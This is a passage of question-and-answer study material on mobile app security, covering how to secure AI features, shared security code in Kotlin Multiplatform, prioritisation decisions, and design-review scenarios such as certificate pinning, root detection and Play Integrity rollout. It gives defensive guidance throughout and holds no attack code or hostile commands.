*Taught in §20.3.*

**Q: Where should the model provider's API key live?** `[Beginner]`

On a server, never in the app, because a key in the app is public and leaked model keys are billed to you by the token. Proxy inference through your backend (the Backend-for-Frontend pattern), which holds the key and checks the caller. No client-side key storage makes an in-app provider key safe, because the attacker controls the device. A managed proxy is fine if it keeps the key server-side and checks the caller: Firebase AI Logic, for example, holds the Gemini key on Google's side and can require Firebase App Check, which is backed by Play Integrity and App Attest.

*Taught in §20.3 and §15.2.*

**Q: What is the strongest business case for attestation on an AI feature?** `[Intermediate]`

That an attacker does not need to steal any data to hurt you; they only need to spend your inference budget. An unattested endpoint behind a metered model is a billing incident waiting to happen, which OWASP lists as LLM06, Unbounded Consumption, and moved up four places in 2026. That framing lands with finance in a way "defence in depth" does not. The controls are App Attest assertions or Play Integrity tokens on the inference path, rate limits per account and per device, token caps per request and per day, and alerts on volume anomalies rather than discovering them on the invoice.

*Taught in §20.4.*

**Q: Does using an on-device model solve prompt injection?** `[Intermediate]`

No: it changes where the data goes, not whether injection works. Gemini Nano in Android's AICore (reached through the ML Kit GenAI APIs) and Apple's Foundation Models framework (iOS 26 and later) keep the prompt on the phone, which helps your data-residency and cost story. But an on-device model reads the same poisoned calendar entry as a cloud one, so you still need the deterministic output gate and confirmations. Availability varies by device, so you still need a fallback.

*Taught in §20.2 and §20.5.*

**Q: Android 17 changes how you stop on-device intelligence capturing a screen. What do you now use?** `[Advanced]`

`FLAG_SECURE`. Android 17 deprecates `ContentCaptureManager.setContentCaptureEnabled(false)`, and for apps targeting API 37 it no longer stops the system's on-device intelligence features from capturing screen content. If a screen must not be captured, the window flag is now the supported control. This is an on-device data flow that never touches your backend, which is why it is easy to miss in a review that only looks at network calls.

*Taught in §20.2 and §6.6.*

**Q: What are you logging, and why does it matter for an AI feature?** `[Beginner]`

Probably prompts, completions, tool-call records and retrieval traces, and all of them frequently contain user data. If your observability pipeline captures them, and by default it probably does, that pipeline is now in scope for every privacy commitment you hold. Your log retention policy has become a data retention policy. The same applies to embeddings and retrieval indexes built from user data: they are user data, so protect them and delete them with everything else.

*Taught in §20.6 and §20.2.*

**Q: What should happen when the model is wrong?** `[Intermediate]`

A defined fallback path, timeout and user-visible behaviour, because a feature with no fallback is an outage with a friendlier name. The model will fail, time out, return something unusable, or simply not be available on this device. For anything consequential, keep a human in the loop and make the model's role legible so the user can apply their own judgement. The 2026 OWASP edition adds a point worth building in: the check that decides whether a proposed action is safe should not be the same model that proposed it.

*Taught in §20.5.*

**Q: Is evaluation a security concern?** `[Intermediate]`

Yes: without an eval set you cannot tell whether a prompt change, a retrieval change or a model version bump broke a behaviour you were treating as a control. An eval set is a fixed collection of test prompts with expected behaviour, and it is regression detection for safety properties as well as quality. Put known injection attempts in it and fail the build when one succeeds. Apple's Foundation Models framework gained an evaluations framework at WWDC26 for exactly this kind of check.

*Taught in §20.7.*

**Q: You bundle model weights or a fine-tuned adapter in the app. How should you treat them?** `[Intermediate]`

As code you ship: a dependency with provenance, pinned hashes and an assumption that it can be extracted. Know where the weights came from and verify their hashes in the build, exactly as you would a library. Assume anyone can pull them out of the package, so do not ship a model whose behaviour you would be embarrassed to see reproduced outside your app. If the model is downloaded after install, verify a signature before loading it, for the same reason as any dynamically loaded code. This is OWASP's LLM04 (Supply Chain) and LLM05 (Data and Model Poisoning) on a phone.

*Taught in §20.8 and §19.5.*

## Kotlin Multiplatform

**Q: Why does KMP security guidance matter now?** `[Beginner]`

Because KMP is no longer niche, and published security guidance for it is close to nonexistent. JetBrains' Developer Ecosystem surveys found its usage more than doubled in a year, from 7% of respondents in 2024 to 18% in 2025, and its Android and iOS targets have been Stable since late 2023. More teams are therefore putting security-relevant code into shared modules without a playbook for where the line should fall. The rest of this group is that playbook.

*Taught in Chapter 21 (introduction).*

**Q: What security code can you share in KMP, and what can you not?** `[Intermediate]`

Share the logic and the contracts; keep the platform trust primitives native. Shareable: token-storage interfaces, encryption behind a shared interface, security-header and nonce construction, encoding, input validation, risk-signal data models, and the pin values for Ktor. Keep native: Keystore and Keychain access, `BiometricPrompt` and `LocalAuthentication`, Play Integrity and App Attest, network security configuration (Android XML, iOS `Info.plist` and the URLSession delegate), and WebView configuration. The rule that generalises: anything whose security derives from platform hardware or a vendor's attestation service cannot be abstracted without losing the property that made it valuable.

*Taught in §21.1.*

**Q: What is the most common KMP security mistake?** `[Intermediate]`

Defining `expect` declarations, or shared interfaces, around mechanism instead of intent. `expect fun getKeystoreKey(alias: String): Key` leaks Android's model into shared code and will not map onto the Secure Enclave, which holds only asymmetric keys (P-256 elliptic-curve keys, plus ML-KEM and ML-DSA post-quantum keys from iOS 26), has no symmetric keys and does not encrypt your data directly. `expect suspend fun storeToken(token: String, requiringUserAuth: Boolean)` describes intent and implements cleanly on both platforms. This is a security point, not an API-style point: an abstraction that forces one platform's mechanism onto the other produces implementations that quietly weaken to fit.

*Taught in §21.2.*

**Q: Should you use `expect class` or an interface for a secure store in common code?** `[Intermediate]`

An interface in common code with platform implementations injected. Expected and actual functions and properties are stable, but expected and actual classes are still Beta and print a compiler warning. An interface is also easier to test, because you can substitute a fake in common tests. The intent-shaped `SecureTokenStore` (store, read, clear) is the pattern to copy.

*Taught in Chapter 21 (introduction) and §21.2.*

**Q: Can Kotlin/Native call CryptoKit directly?** `[Intermediate]`

No: Kotlin/Native calls Objective-C and C APIs directly, and CryptoKit is Swift-only. You either write a small Swift wrapper exposed to Objective-C, or you use the Security framework, which is callable from Kotlin/Native as it stands. Kotlin's Swift export does not change this: it runs the other way, letting Swift call your Kotlin, and it is still Alpha. Whichever route you take, the wrapper is security code and needs the same review as the rest.

*Taught in §21.1.*

**Q: What are your options for doing cryptography in shared KMP code?** `[Intermediate]`

Three: an interface in common code with platform `actual`s, the `cryptography-kotlin` library, or doing the crypto on the server instead. Platform `actual`s (Tink or the JCA on Android; CryptoKit via a wrapper, or the Security framework, on iOS) give the most control and the most review surface. `cryptography-kotlin` (`dev.whyoleg.cryptography`) wraps JCA, OpenSSL, CryptoKit and WebCrypto behind one API with less code, but it is a community project at 0.x, so pin the version and review it like any dependency. Server-side is often the right answer for anything a backend could own. In every case, the keys still come from the platform keystore on each side.

*Taught in §21.1.*

**Q: Does configuring pinning in Ktor's common code pin both platforms?** `[Intermediate]`

No: Ktor's common API does not pin at all; each engine enforces pinning and each is configured separately. The shape that works is pin values in `commonMain` and enforcement in each platform's `actual`: OkHttp's `CertificatePinner` for the OkHttp engine on Android, and the Darwin engine's own `CertificatePinner`, modelled on OkHttp's, on iOS. Neither side then needs hand-written trust code. The failure to watch for is configuring Android, forgetting iOS, and passing the test suite, so put both `actual`s in the same pull request and verify pinning on both.

*Taught in §8.10.*

**Q: What catches out teams using Ktor's Darwin engine with their own `URLSession`?** `[Advanced]`

If you hand Ktor a preconfigured session with `usePreconfiguredSession`, Ktor's `handleChallenge` block is ignored, so your session's delegate must do the pinning instead. The code looks as though it pins, because the pinner is still configured, but nothing enforces it. Remember too that Ktor pinning covers only traffic through your Ktor client: Android WebView traffic needs a network security configuration entry, and `WKWebView` is outside it entirely.

*Taught in §8.10.*

**Q: What gets missed in review on a KMP codebase?** `[Intermediate]`

The platform `actual` implementations. Shared code is read by everyone; platform-specific code is often read by one person. The iOS `actual` that stored a token with `kSecAttrAccessibleAlways` to fix a background-refresh bug survives because the Android reviewers never opened that file, even though that class has been deprecated since iOS 12; the real fix is to restructure when the work happens, or, if background work genuinely needs the credential, `AfterFirstUnlockThisDeviceOnly`. Make `iosMain` and `androidMain` changes require a reviewer from that platform.

*Taught in §21.3 and §4.4.*

**Q: What does KMP add to your CI security budget?** `[Beginner]`

macOS runners for the iOS targets, which are a real cost line and another runner to harden and monitor. Treat them with the same controls as the rest of your pipeline: least-privilege tokens, secrets exposed only to the job that needs them, and monitoring. Budget for them at the start rather than discovering them as an afterthought.

*Taught in §21.3.*

## Judgement

**Q: You have two weeks and one engineer. What comes first?** `[Intermediate]`

Audit for hardcoded secrets and rotate anything exposed, because that removes the most risk per day spent. There is no sense hardening a client while a working key sits in git history. Then add blocking commit scanning so it does not recur, move tokens into Keystore- or Keychain-backed storage, check the TLS configuration, and write down the pinning decision. Attestation, biometrics and tamper detection come after: attestation and biometrics depend on hardware-backed keys being in place, and tamper detection has the worst ratio of effort to risk reduced.

*Taught in §32.1 and §32.2.*

**Q: If the programme gets squeezed, what do you cut first?** `[Beginner]`

Phase 4, hardening: tamper and hook detection, obfuscation and similar controls. It has the lowest ratio of risk reduced to effort, which is why the plan puts it last and marks it optional. Never cut the secret audit and rotation, because every later phase assumes no live credential is exposed. Each phase ends at a gate, so a paused programme still leaves you with something tested.

*Taught in §32.1 and §32.2.*

**Q: Your product manager wants "bank-level security". What do you ask?** `[Intermediate]`

What data are we handling, which regulator cares, and what is the actual threat: account takeover, payment fraud, data exfiltration or cloning? "Bank-level" is not a specification. The MAS testing profiles turn the answer into one: MAS-L1 is the baseline for every app, MAS-L2 adds protection against an untrusted OS for apps with high-risk data such as finance or health, MAS-R sits on top of L1 or L2 when the user of the device is the adversary, and MAS-P covers personal-data handling. Say "the MAS-L2 profile", not "MASVS L2": the levels left the MASVS in 2023.

*Taught in §3.2.*

**Q: How do you justify security work to a finance stakeholder?** `[Intermediate]`

Compare prevention cost to incident cost using current figures, then scope your own exposure honestly. The 2026 IBM report gives a $4.99M global average (a record), $11.5M in the US and 247 days to identify and contain. Most mobile incidents cost far less than an enterprise average, so derive your own figure from your users, data and fraud history, and say "that is not our exposure; ours is approximately X". Overstating it costs you credibility on every future request.

*Taught in §2.3 and §29.4.*

**Q: A slide in 2026 quotes a $4.88M average breach cost. What is wrong with it?** `[Beginner]`

It is two reports behind. IBM's global average was $4.88M in 2024, fell to $4.44M in 2025 (the first decline in five years), and rose to a record $4.99M in 2026. People quote whichever year suits them, so check the edition year on the report itself, not on the blog post that quoted it. IBM publishes each July, Verizon each spring, GitGuardian each March.

*Taught in §2.1 and §2.3.*

**Q: What is the most over-engineered control you see, and the most under-engineered?** `[Advanced]`

Over: elaborate client-side root detection with hard local blocks, which is one hook away from removal and generates support load. Under: server-side validation of what the client sent, and token binding. The second pair is unglamorous and decides whether an attack works: the client proposes, the server decides, and a sender-constrained token is useless off the device that holds its key. The one fair exception to "report, never block" is a feature that acts offline or holds secrets the backend cannot revoke; even then, degrade that feature, keep the rest of the app working, and still report.

*Taught in §14.2 and §12.1.*

**Q: When is the right decision not to pin?** `[Intermediate]`

When the team cannot operate a pin set for the next three years without locking users out. Pinning done badly (one pin, no backup, no rotation plan, no monitoring) is worse than not pinning, because it adds a self-inflicted outage risk without meaningfully raising an attacker's cost. The question is about runbooks, ownership and monitoring, not cryptography. If the answer is no, decide not to pin and say so plainly, rather than pinning badly to satisfy a checklist.

*Taught in §8.3.*

**Q: Should every value your Android app stores be encrypted?** `[Intermediate]`

No: decide by threat model, not by reflex. Since Android 10, file-based encryption is mandatory and the sandbox keeps other apps out of your private files, so reading them generally needs physical access plus an exploit or an already compromised device. OWASP agrees: `MASWE-0001`, unencrypted data in private storage, is tagged MAS-L2, not L1. Give long-lived refresh tokens and credentials Keystore-protected keys and encrypted payloads, hold short-lived access tokens in memory where you can, keep feature flags in plain DataStore, and do not store what you can avoid storing.

*Taught in §6.4 and §3.2.*

**Q: How do you rate a finding that requires a rooted device?** `[Intermediate]`

Honestly: "requires root" is a genuine mitigating factor, so state it, but do not use it to dismiss something that matters. In CVSS v4.0 it belongs in Attack Requirements (`AT:P`), and physical possession belongs in Attack Vector (`AV:P`). Record the full vector string so a reader can see your reasoning, and remember that CVSS measures severity, not risk, so enrich the Base score before calling something a priority. A report where everything is critical gets ignored.

*Taught in §23.3.*

**Q: What claim earns you credibility in mobile security?** `[Beginner]`

"I attacked my own app, here is what I found, here is what I changed, and here is what I decided to accept." That is a different claim from "I know which controls to specify", and interviewers and reviewers can tell them apart within two questions. The last clause matters most: a findings document with what held and the residual risk you accepted reads like an assessment rather than a tool dump.

*Taught in §23.4 and §23.6.*

## Design-review scenarios

**Q: Design review: your product manager wants to block rooted and jailbroken devices at launch. What do you recommend?** `[Intermediate]`

Detect root and jailbreak, report it to your backend as a risk signal, and let the session continue. A local block is one hook away from removal, it turns developers, custom-ROM users and accessibility-tool users into support tickets, and a "device not supported" dialog tells the attacker exactly which check to remove next. Send the signals with a Play Integrity or App Attest result bound to the same request, so an empty signal list from a device that fails attestation is itself suspicious. Let the server respond proportionately: step-up authentication, lower limits or review for the risky flows. If a feature genuinely acts offline, degrade that feature only, and still report.

*Taught in §14.2 and §12.2.*

**Q: A pentest report lists "no certificate pinning" as high severity. How do you respond?** `[Intermediate]`

Treat it as a decision to make and record, not a defect to patch overnight. Pinning is right for banking, fintech and health apps whose team can operate a pin set: SPKI pins on an intermediate, a backup at a second CA or on a key you hold, CT monitoring and a remote kill switch. For a content or marketplace app, strict TLS plus CT monitoring is a defensible position, and pinning badly is worse than not pinning. Either way, write the decision down with its reasoning, and ask the tester to rate the finding against your threat model rather than a checklist: without pinning, interception needs a rogue or compromised CA or a root installed on the device by someone other than you, and pinning does nothing against an attacker on their own device.

*Taught in §7.2, §8.3, §8.8 and §23.3.*

**Q: Your CI uses `pull_request_target` to label pull requests. Is that acceptable?** `[Advanced]`

It can be, provided the job never checks out or runs the fork's code, never interpolates pull-request text into a `run:` step, and never writes a cache or artifact another workflow consumes. `pull_request_target` runs with your base repository's secrets and a writable token even for forks, and it was the vector in Ultralytics, Nx "s1ngularity" and TanStack. Set `permissions: {}` at workflow level and grant the job only what adding a label needs. Note that a default workflow execution protections rule disables the trigger in public repositories from 2 November 2026 unless you opt back in, and run zizmor and actionlint in CI to catch dangerous triggers and template injection mechanically.

*Taught in §15.3 and §15.1.*

**Q: Marketing wants an AI assistant that can read account data and act on the user's behalf. What design do you insist on?** `[Advanced]`

A backend proxy that holds the model key and re-authorises every action, a deterministic gate on the model's output, and user confirmation before anything with side effects. The model sits outside both trust boundaries: give it the minimum account data the feature needs, redact before transmission, and never let it be the thing that decides authorisation. Each tool is an exported entry point, so it runs under the user's own session on your server, with money, messages and deletion confirmed by the user and, on iOS, `authenticationPolicy` and `requestConfirmation()` on App Intents. Before shipping, talk to whoever owns your regulatory commitments, check the provider's retention and training settings, and bring prompt and completion logs into your privacy scope.

*Taught in §20.1, §20.2, §20.3 and §20.6.*

**Q: Legal asks whether the app is "MASVS certified" for a tender. What do you tell them?** `[Intermediate]`

That no such certification exists: OWASP does not certify vendors, verifiers or software, and it warns that trust marks claiming MASVS certification are not vetted by OWASP. What you can offer is a verification statement: which MAS profile you tested against (MAS-L1 as the baseline, L2 for high-risk data, R and P as they apply), which controls you meet, how you tested each against the MASTG, and the date. If the tender needs a third-party scheme, Google's App Defense Alliance MASA and CREST OVS both reference MASVS and MASTG, but they are those organisations' programmes. Add that the MASVS covers the app, not the backend, which the OWASP ASVS addresses.

*Taught in §3.3 and §3.2.*

**Q: During a review you find an API key in the release APK. What do you do?** `[Intermediate]`

Classify it first, then act: a client identifier is expected to ship, but a restricted key must be rotated immediately and moved behind your backend. Client identifiers such as OAuth client IDs, Firebase configuration or Maps SDK keys necessarily ship, and you protect them server-side by restricting them to your package name and signing certificate or bundle ID. A key with quota or cost attached, including a model-provider key, is public and metered the moment it ships, so rotate first, then clean history, check access logs for use of the old key, and proxy the calls through your backend. Then fix the cause: why did the classification not stop it? Put `strings` on the release artifact and blocking secret scanning in the release gate.

*Taught in §15.2 and §24.4.*

**Q: A designer wants "use device PIN instead" as the fallback on the biometric key that authorises transfers. Do you agree?** `[Advanced]`

Not for high-value transfers: fall back to server-side step-up instead. Letting the key accept the device credential (`AUTH_DEVICE_CREDENTIAL`) silently switches off Android's invalidation on new biometric enrolment, which is the defence against a thief who adds their own fingerprint, and that thief usually already knows the PIN. A device PIN that unlocks the same hardware key is a real cryptographic check, but only as strong as the PIN, so it is acceptable for moderate-risk actions. For transfers, fall back to the account password, a passkey or a one-time code to a channel registered earlier, and keep the biometric key biometric-only with `.biometryCurrentSet` on iOS.

*Taught in §11.3 and §11.4.*

**Q: A backend change request has the app send `userId` and the final price in the request body. What is your review comment?** `[Beginner]`

Reject both: derive the acting user from the session token, and compute the price on the server. The client proposes; the server decides. A `userId` in the body is a suggestion anyone can edit, and it is how one user reads another's data; an API that accepts a price from the client is not a pricing bug but a free store. No client-side hardening changes this, because the attacker controls the device.

*Taught in §12.1.*

**Q: The growth team wants password-reset and transfer links to open the app through `myapp://`. What do you change?** `[Intermediate]`

Use verified https links (Android App Links, iOS Universal Links) instead, and validate every parameter even then. Any app can register a custom scheme, so a malicious app can intercept links meant for you; that is the authorisation-code interception attack against OAuth. On Android, `android:autoVerify="true"` plus an `assetlinks.json` carrying the app signing key's fingerprint from Play Console, not your upload key; on iOS, the Associated Domains entitlement and an `apple-app-site-association` file served with no redirects. Verification proves the link reached the right app, not that its sender is friendly, so a transfer link must still lead to confirmation and step-up authentication, never straight to execution.

*Taught in §17.5.*

**Q: After April 2026 your key attestation verifier starts rejecting most modern Android phones. What happened, and what is the lasting fix?** `[Advanced]`

Google's new ECDSA P-384 root ("Key Attestation CA 1") began signing chains on 1 February 2026, and RKP-enabled devices reportedly switched to it exclusively on 10 April 2026, so a verifier that trusts only the old RSA root fails. The immediate fix is to trust both roots, because factory-provisioned devices still chain to the RSA one. The lasting fix is to stop hard-coding the root, the chain length or the signature algorithm: load roots from Google's published list, accept any chain length, use a library that supports every announced algorithm, and honour the revocation list's `Cache-Control`. Android 17 has begun a move to post-quantum attestation chains, so expect this again.

*Taught in §5.3.*

**Q: Marketing wants to add a new attribution SDK before a campaign next week. What do you check?** `[Intermediate]`

What it collects, where it sends it, whether you can configure it down, and whether your store privacy declarations cover it, then verify the answers by capturing its traffic. The SDK runs inside your app with your permissions, so its network calls are your data flows and your liability. Check the Google Play SDK Index for flagged versions, and read its iOS privacy manifest before its marketing. On Android 11 and later, data-access auditing in a debug build shows what it actually touches, which is more reliable than its documentation.

*Taught in §18.4.*

**Q: A certificate rotation breaks pinning in production and users cannot connect. There is no kill switch. What now, and what do you change afterwards?** `[Intermediate]`

Put a key the shipped pins accept back into service if you still hold one, and ship an emergency release either way. Without a remote switch you are waiting on store review and users updating, which is exactly the outage risk pinning's critics describe. Afterwards, build a remote kill switch that takes effect in seconds: real-time Remote Config with `addOnConfigUpdateListener` or equivalent, since the default 12-hour fetch interval is not an incident tool, read on the next request rather than only at launch. Protect that switch like a key, because an unauthenticated switch is a bypass. Then close the gaps that caused the outage: backup pins in every release, an alert on pin-validation failures, and a rotation runbook with a named owner in which the new pin ships long before the new key serves traffic.

*Taught in §24.4, §24.1 and §8.7.*

**Q: A pull request stores the new refresh token with `EncryptedSharedPreferences`. What is your review comment?** `[Intermediate]`

Replace it: Google deprecated every API in Jetpack Security Crypto on 9 April 2025, and nothing has been released since the stable 1.1.0 of July 2025. Use three layers, each doing one job: Jetpack DataStore for persistence, Tink for encryption through an AEAD, and a Keystore master key protecting Tink's keyset. Remember that DataStore on its own is not encrypted. A refresh token is long-lived and worth stealing, so it does deserve the encryption; where the flow tolerates it, make the key authentication-bound.

*Taught in §6.1, §6.3 and §6.4.*

**Q: The fraud team wants to reject every request that fails Play Integrity from the day the integration ships. What do you propose?** `[Intermediate]`

Ship in report-only mode first, which is Google's documented rollout, not caution. Log verdicts from your real install base and look at the distribution per label, per Android version and per country; only then estimate what each enforcement option would cost. Enforce incrementally, starting with the highest-value flows, and feed the verdict into a risk score rather than an allow-or-block switch. When you do restrict someone, have your server return a remediation dialog code such as `GET_INTEGRITY` so the user has a way out.

*Taught in §9.4 and §12.2.*

**Q: A team plans to download an updated on-device model every week instead of bundling it. What must the design include?** `[Advanced]`

Signature verification before the model is loaded, plus the same provenance and hash pinning you would apply to any dependency. A model downloaded after install is dynamically loaded code in all but name: if an attacker can substitute it, they change your feature's behaviour without touching your binary. Know where the weights came from, verify them in the pipeline that publishes them, and assume anyone can extract the model from the device. It also still needs the deterministic output gate, because a genuine model can read a poisoned document.

*Taught in §20.8, §19.5 and §20.1.*
